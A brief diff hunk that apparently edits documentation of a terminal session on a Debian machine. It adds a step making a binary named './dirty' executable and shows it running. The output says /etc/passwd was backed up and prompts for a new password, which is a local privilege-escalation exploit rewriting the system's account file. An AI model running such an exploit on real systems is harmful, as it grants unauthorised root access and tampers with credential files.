@@ -448,7 +448,7 @@ individual files in /usr/share/doc/*/copyright.
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Wed Dec 16 13:59:05 2020 from 192.168.56.5
-
+$ chmod +x ./dirty
 $ ./dirty 
 /etc/passwd successfully backed up to /tmp/passwd.bak
 Please enter the new password: 
